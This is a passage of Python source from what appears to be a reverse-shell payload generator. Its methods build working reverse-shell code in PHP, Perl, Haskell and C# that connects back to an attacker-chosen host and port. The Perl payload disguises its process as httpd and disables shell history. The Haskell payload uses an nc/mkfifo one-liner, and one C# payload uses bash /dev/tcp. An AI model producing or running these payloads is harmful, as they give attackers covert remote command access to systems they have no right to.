                                                                                         "	if (in_array($pipes[1], $read_a)) {\n" \
                                                                                         "	if ($debug) printit(\"STDOUT READ\");\n" \
                                                                                         "		$input = fread($pipes[1], $chunk_size);\n" \
                                                                                         "	if ($debug) printit(\"STDOUT: $input\");\n" \
                                                                                         "		fwrite($sock, $input);\n" \
                                                                                         "	}\n" \
                                                                                         "\n" \
                                                                                         "	if (in_array($pipes[2], $read_a)) {\n" \
                                                                                         "	if ($debug) printit(\"STDERR READ\");\n" \
                                                                                         "		$input = fread($pipes[2], $chunk_size);\n" \
                                                                                         "	if ($debug) printit(\"STDERR: $input\");\n" \
                                                                                         "		fwrite($sock, $input);\n" \
                                                                                         "	}\n" \
                                                                                         "}\n" \
                                                                                         "fclose($sock);\n" \
                                                                                         "fclose($pipes[0]);\n" \
                                                                                         "fclose($pipes[1]);\n" \
                                                                                         "fclose($pipes[2]);\n" \
                                                                                         "proc_close($process);\n" \
                                                                                         "\n" \
                                                                                         "function printit ($string) {\n" \
                                                                                         "	if (!$daemon) {\n" \
                                                                                         "		print \"$string\\n\";\n" \
                                                                                         "	}\n" \
                                                                                         "}\n" \
                                                                                         "\n" \
                                                                                         "?>\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def Perl(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "use strict;                                                             \n" \
                                 "use Socket;                                                             \n" \
                                 "use FileHandle;                                                         \n" \
                                 "use POSIX;                                                              \n" \
                                 "my $VERSION = \"1.0\";                                                    \n" \
                                 "                                                                       \n" \
                                 "# Where to send the reverse shell.  Change these.                      \n" \
                                 "my $ip = \'" + self.__target + "\';                                         \n" \
                                                                 "my $port = " + self.__port + ";                                              \n" \
                                                                                               "\n" \
                                                                                               "# Options                                                              \n" \
                                                                                               "my $daemon = 1;                                                         \n" \
                                                                                               "my $auth   = 0; # 0 means authentication is disabled and any            \n" \
                                                                                               "# source IP can access the reverse shell                         \n" \
                                                                                               "my $authorised_client_pattern = qr(^127\.0\.0\.1$);                     \n" \
                                                                                               "\n" \
                                                                                               "# Declarations                                                         \n" \
                                                                                               "my $global_page = \"\";                                                   \n" \
                                                                                               "my $fake_process_name = \"/usr/sbin/apache\";                             \n" \
                                                                                               "\n" \
                                                                                               "# Change the process name to be less conspicious                       \n" \
                                                                                               "$0 = \"[httpd]\";                                                         \n" \
                                                                                               "\n" \
                                                                                               "# Authenticate based on source IP address if required                  \n" \
                                                                                               "if (defined($ENV{\'REMOTE_ADDR\'})) {                                     \n" \
                                                                                               "	cgiprint(\"Browser IP address appears to be: $ENV{\'REMOTE_ADDR\'}\");   \n" \
                                                                                               "                                                                            \n" \
                                                                                               "	if ($auth) {                                                         \n" \
                                                                                               "		unless ($ENV{\'REMOTE_ADDR\'} =~ $authorised_client_pattern) {     \n" \
                                                                                               "			cgiprint(\"ERROR: Your client isn\'t authorised to view this page\n" \
                                                                                               "			cgiexit();                                                   \n" \
                                                                                               "		}                                                                \n" \
                                                                                               "	}                                                                    \n" \
                                                                                               "} elsif ($auth) {                                                      \n" \
                                                                                               "	cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\"); \n" \
                                                                                               "	cgiexit(0);                                                          \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Background and dissociate from parent process if required            \n" \
                                                                                               "if ($daemon) {                                                          \n" \
                                                                                               "	my $pid = fork();                                                    \n" \
                                                                                               "	if ($pid) {                                                          \n" \
                                                                                               "		cgiexit(0); # parent exits                                       \n" \
                                                                                               "	}                                                                    \n" \
                                                                                               "                                                                       \n" \
                                                                                               "	setsid();                                                            \n" \
                                                                                               "	chdir(\'/\');                                                          \n" \
                                                                                               "	umask(0);                                                            \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Make TCP connection for reverse shell                                \n" \
                                                                                               "socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname(\'tcp\'));              \n" \
                                                                                               "if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {                 \n" \
                                                                                               "	cgiprint(\"Sent reverse shell to $ip:$port\");                         \n" \
                                                                                               "	cgiprintpage();                                                      \n" \
                                                                                               "} else {                                                               \n" \
                                                                                               "	cgiprint(\"Couldn\'t open reverse shell to $ip:$port: $!\");            \n" \
                                                                                               "	cgiexit();	                                                         \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Redirect STDIN, STDOUT and STDERR to the TCP connection              \n" \
                                                                                               "open(STDIN, \">&SOCK\");                                                  \n" \
                                                                                               "open(STDOUT,\">&SOCK\");                                                  \n" \
                                                                                               "open(STDERR,\">&SOCK\");                                                  \n" \
                                                                                               "$ENV{\'HISTFILE\'} = \'/dev/null\';                                        \n" \
                                                                                               "system(\"w;uname -a;id;pwd\");                                            \n" \
                                                                                               "exec({\"/bin/bash\"} ($fake_process_name, \"-i\"));                         \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Wrapper around print                                                 \n" \
                                                                                               "sub cgiprint {                                                          \n" \
                                                                                               "	my $line = shift;                                                    \n" \
                                                                                               "	$line .= \"<p>\\n\";                                                    \n" \
                                                                                               "	$global_page .= $line;                                               \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Wrapper around exit                                                  \n" \
                                                                                               "sub cgiexit {                                                           \n" \
                                                                                               "	cgiprintpage();                                                      \n" \
                                                                                               "	exit 0; # 0 to ensure we don\'t give a 500 response.                  \n" \
                                                                                               "}                                                                      \n" \
                                                                                               "                                                                       \n" \
                                                                                               "# Form HTTP response using all the messages gathered by cgiprint so far\n" \
                                                                                               "sub cgiprintpage {                                                      \n" \
                                                                                               "	print \"Content-Length: \" . length($global_page) . \"\\r                \n" \
                                                                                               "Connection: close\\r                                                     \n" \
                                                                                               "Content-Type: text\\/html\\r\\n\\r\\n\" . $global_page;                       \n" \
                                                                                               "}                                                                      \n"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def Haskell_1(self):
        """
            Description: This payload support GNU/Linux and Mac OSX
        """
        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "module Main where\n" \
                                 "\n" \
                                 "import System.Process\n" \
                                 "\n" \
                                 "main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc " + self.__target + " " + self.__port + "  >/tmp/f\"\n"
                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def CsharpBash_i(self):
        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "using System;\n" \
                                 "using System.Diagnostics;\n" \
                                 "\n" \
                                 "namespace BackConnect {\n" \
                                 "  class ReverseBash {\n" \
                                 "	public static void Main(string[] args) {\n" \
                                 "	  Process proc = new System.Diagnostics.Process();\n" \
                                 "	  proc.StartInfo.FileName = \"/bin/bash\";\n" \
                                 "	  proc.StartInfo.Arguments = \"-c \\\"/bin/bash -i >& /dev/tcp/" + self.__target + "/" + self.__port + " 0>&1\\\"\";\n" \
                                                                                                                                             "	  proc.StartInfo.UseShellExecute = false;\n" \
                                                                                                                                             "	  proc.StartInfo.RedirectStandardOutput = true;\n" \
                                                                                                                                             "	  proc.Start();\n" \
                                                                                                                                             "\n" \
                                                                                                                                             "	  while (!proc.StandardOutput.EndOfStream) {\n" \
                                                                                                                                             "		Console.WriteLine(proc.StandardOutput.ReadLine());\n" \
                                                                                                                                             "	  }\n" \
                                                                                                                                             "	}\n" \
                                                                                                                                             "  }\n" \
                                                                                                                                             "}\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status

    def CsharpTcpClient(self):
        self.__prompt = self.__prompt_linux if self.validate_parameter_linux()['code'] == 200 else self.__prompt_windows

        if self.validate_parameters()['code'] == 200 and (
                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_windows()['code'] == 200) and \
                self.validate_parameter_type_reverse()['code'] == 200:
            try:
                self.__payload = "using System;\n" \
                                 "using System.Text;\n" \
                                 "using System.IO;\n" \
                                 "using System.Diagnostics;\n" \
                                 "using System.ComponentModel;\n" \
                                 "using System.Linq;\n" \
                                 "using System.Net;\n" \
                                 "using System.Net.Sockets;\n" \
                                 "\n" \
                                 "\n" \
                                 "namespace ConnectBack\n" \
                                 "{\n" \
                                 "  public class Program\n" \
                                 "  {\n" \
                                 "    static StreamWriter streamWriter;\n" \
                                 "\n" \
                                 "    public static void Main(string[] args)\n" \
                                 "    {\n" \
                                 "      using(TcpClient client = new TcpClient(\"" + self.__target + "\", " + str(
                    self.__port) + "))" \
                                   "      {\n" \
                                   "        using(Stream stream = client.GetStream())\n" \
                                   "        {\n" \
                                   "          using(StreamReader rdr = new StreamReader(stream))" \
                                   "          {\n" \
                                   "            streamWriter = new StreamWriter(stream);\n" \
                                   "\n" \
                                   "            StringBuilder strInput = new StringBuilder();\n" \
                                   "\n" \
                                   "            Process p = new Process();\n" \
                                   "            p.StartInfo.FileName = \"" + self.__prompt + "\";\n" \
                                                                                                                          "            p.StartInfo.CreateNoWindow = true;\n" \
                                                                                                                          "            p.StartInfo.UseShellExecute = false;\n" \
                                                                                                                          "            p.StartInfo.RedirectStandardOutput = true;\n" \
                                                                                                                          "            p.StartInfo.RedirectStandardInput = true;\n" \
                                                                                                                          "            p.StartInfo.RedirectStandardError = true;\n" \
                                                                                                                          "            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n" \
                                                                                                                          "            p.Start();\n" \
                                                                                                                          "            p.BeginOutputReadLine();\n" \
                                                                                                                          "\n" \
                                                                                                                          "            while(true)\n" \
                                                                                                                          "            {\n" \
                                                                                                                          "              strInput.Append(rdr.ReadLine());\n" \
                                                                                                                          "              p.StandardInput.WriteLine(strInput);\n" \
                                                                                                                          "              strInput.Remove(0, strInput.Length);\n" \
                                                                                                                          "             }\n" \
                                                                                                                          "           }\n" \
                                                                                                                          "         }\n" \
                                                                                                                          "       }\n" \
                                                                                                                          "    }\n" \
                                                                                                                          "\n" \
                                                                                                                          "    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n" \
                                                                                                                          "    {\n" \
                                                                                                                          "        StringBuilder strOutput = new StringBuilder();\n" \
                                                                                                                          "    \n" \
                                                                                                                          "        if (!String.IsNullOrEmpty(outLine.Data))\n" \
                                                                                                                          "        {\n" \
                                                                                                                          "            try\n" \
                                                                                                                          "            {\n" \
                                                                                                                          "                strOutput.Append(outLine.Data);\n" \
                                                                                                                          "                streamWriter.WriteLine(strOutput);\n" \
                                                                                                                          "                streamWriter.Flush();\n" \
                                                                                                                          "            }\n" \
                                                                                                                          "            catch (Exception err) { }\n" \
                                                                                                                          "        }\n" \
                                                                                                                          "     }\n" \
                                                                                                                          "  \n" \
                                                                                                                          "  }\n" \
                                                                                                                          "}\n"

                self.__status['code'] = 200
                self.__status['message'] = self.__payload
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(
                    self.__status['message']) != 0 else color.color(
                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                              str(Error))
        return self.__status
